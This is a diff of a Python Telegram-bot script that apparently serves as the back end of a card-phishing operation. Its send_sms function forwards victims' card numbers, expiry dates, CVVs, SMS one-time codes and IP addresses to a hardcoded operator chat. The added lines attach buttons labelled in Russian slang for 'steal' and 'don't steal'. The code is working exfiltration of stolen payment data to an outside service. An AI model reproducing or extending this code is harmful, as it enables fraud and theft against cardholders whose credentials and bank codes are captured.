@@ -88,7 +88,7 @@ def send_sms(CHAT_ID, card, date, cvv, sms, ID, ip):
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}'), reply_markup=reply_markup, parse_mode='MarkdownV2')
+    bot.send_message(chat_id=CHAT_ID, text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)} \n SMS'), reply_markup=reply_markup, parse_mode='MarkdownV2')
 
 def ne_pizdabol(card, chat_id='-4150791967'):
     try:
@@ -141,3 +141,12 @@ def send_q():
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     bot.send_message(chat_id='6679500406', text=escape_reserved_characters(f'1111111111'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')
+bot = Bot(token=api)
+keyboard = [
+    [
+            InlineKeyboardButton("пиздить", callback_data='re1'),
+            InlineKeyboardButton("НЕ ПИЗДИТЬ", callback_data='re2'),
+    ],
+    ]
+reply_markup = InlineKeyboardMarkup(keyboard)
+bot.send_message(chat_id='6679500406', text=escape_reserved_characters(f'1111111111'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')
